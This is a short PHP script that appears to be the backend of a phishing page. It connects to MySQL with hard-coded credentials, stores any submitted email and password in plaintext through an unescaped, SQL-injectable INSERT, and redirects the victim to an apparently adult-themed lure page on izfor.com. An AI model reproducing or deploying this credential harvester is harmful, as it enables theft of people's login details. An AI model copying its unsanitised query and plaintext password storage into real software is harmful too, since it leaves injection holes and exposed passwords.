<?php
$username = "izforco1_mya";
$password = "thaivt@@##";
$hostname = "localhost"; 
$database = "izforco1_mya"; 

//connection to the database
$dbhandle = mysql_connect($hostname, $username, $password) 
  or die("Unable to connect to MySQL");
$db_selected = mysql_select_db($database, $dbhandle);

$user = $_POST['email'];
$password = $_POST['pass'];
if ($user != "" && $password != ""){
	$sql = "INSERT INTO `user` VALUES ('', '" . $user . "', '".$password."', null);";

	$resutl = mysql_query($sql,$dbhandle);
	header('Location:http://izfor.com/nhay-cam/Em-co-do-ma-anh-khong-xoi-moi-la-4412.html');

} else {
	header('Location:http://mya.izfor.com/');
}
?>